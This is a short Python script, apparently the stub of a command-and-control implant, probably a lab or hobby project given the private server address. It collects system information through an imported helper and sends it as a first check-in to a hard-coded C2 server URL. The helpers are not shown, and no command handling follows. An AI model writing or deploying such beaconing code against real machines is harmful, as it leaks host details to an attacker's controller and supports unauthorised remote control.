from functions.c2_functions import get_sysinfo, first_checkin

SERVER_URL = "http://192.168.2.10:5000/checkin"

def c2():
    sysinfo = get_sysinfo()
    first_response = first_checkin(SERVER_URL, sysinfo)

    if not first_response:
        print("Failed?")
        return
    
if __name__ == "__main__":
    c2()